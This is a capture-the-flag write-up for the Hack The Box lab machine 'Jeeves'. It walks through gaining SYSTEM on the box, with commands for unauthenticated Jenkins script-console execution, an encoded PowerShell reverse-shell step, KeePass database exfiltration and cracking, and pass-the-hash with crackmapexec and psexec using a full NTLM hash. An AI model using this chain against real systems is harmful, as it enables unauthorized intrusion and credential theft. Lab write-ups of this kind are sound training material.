# JEEVES

## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB)
- **Key Techniques:**  
  1. Unauthenticated Jenkins RCE  
  2. Exfil KeePass DB via Jenkins workspace  
  3. Crack master‑password → extract NTLM hash  
  4. Pass‑the‑hash to get SYSTEM  
  5. Alternate Data Stream for root.txt  

---

## TL;DR 🚀
1. **Recon:**  
   - `nmap` → ports **80** (IIS), **50000** (Jetty), **445** (SMB)  
   - Web on 50000 → **/askjeeves** found with `gobuster` + DirBuster list  
2. **Jenkins RCE:**  
   - Navigate to `http://10.10.10.63:50000/askjeeves` → Jenkins UI, no auth  
   - Use **Script Console** or create a **Freestyle Job** to run `cmd.exe /c whoami`  
   - Replace with reverse‑shell payload → get `jeeves\kohsuke` shell  
3. **Initial Shell (kohsuke):**  
   - `type C:\Users\kohsuke\Desktop\user.txt` → user flag  
   - Find `CEH.kdbx` in `C:\Users\kohsuke\Documents`  
4. **Exfil & Crack KeePass:**  
   - Copy `CEH.kdbx` into Jenkins workspace → download  
   - `keepass2john CEH.kdbx > CEH.hash`  
   - `hashcat CEH.hash rockyou.txt` → **moonshine1**  
5. **Dump NTLM Hash:**  
   - `kpcli --kdb CEH.kdbx` → show “Backup stuff” entry:  
     ```
     LM: aad3b435…0000   NT: e0fb1fb8…fe00
     ```  
6. **Pass‑the‑Hash → SYSTEM:**  
   - `crackmapexec smb 10.10.10.63 -u Administrator -H aad3b435…:e0fb1fb8…` (Pwn3d!)  
   - `psexec.py -hashes aad3b435…:e0fb1fb8… Administrator@10.10.10.63 cmd.exe`  
7. **Root Flag via ADS:**  
   - On admin desktop: `dir /R hm.txt`  
   - Read hidden stream: `more < hm.txt:root.txt` → root flag  

---

## Essential Commands 🛠️

```bash
# 1. Find Jenkins (/askjeeves) on port 50000
gobuster dir -u http://10.10.10.63:50000/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x txt,php,html

# 2. Jenkins RCE via Script Console
# (e.g.) Groovy: println "cmd.exe /c whoami".execute().text

# 3. Reverse shell payload in a Freestyle Jenkins job
powershell -NoP -NonI -W Hidden -Exec Bypass \
  -EncodedCommand <base64-payload>

# 4. KeePass master-password cracking
keepass2john CEH.kdbx > CEH.hash
hashcat -m 13400 CEH.hash /usr/share/wordlists/rockyou.txt

# 5. Extract NTLM hash with kpcli
kpcli --kdb CEH.kdbx
  find .
  show -f <entry#>

# 6. Pass‑the‑hash to get SYSTEM
crackmapexec smb 10.10.10.63 \
  -u Administrator \
  -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

# 7. Psexec shell
psexec.py -hashes aad3b435…:e0fb1fb8… \
  Administrator@10.10.10.63 cmd.exe

# 8. Read root.txt from ADS
dir /R hm.txt
more < hm.txt:root.txt
```

---

## Key Takeaways 🔑
- **Unauthenticated Jenkins** → immediate RCE via Script Console or build steps.  
- **Jenkins workspace** makes exfil—drop any file there and fetch over HTTP.  
- **KeePass DB** on user profile can leak high‑priv creds if master password is weak.  
- **Pass‑the‑hash** remains a powerful Windows attack when NTLM hashes are recovered.  
- **Alternate Data Streams (ADS)** hide files in plain sight—remember `dir /R`.  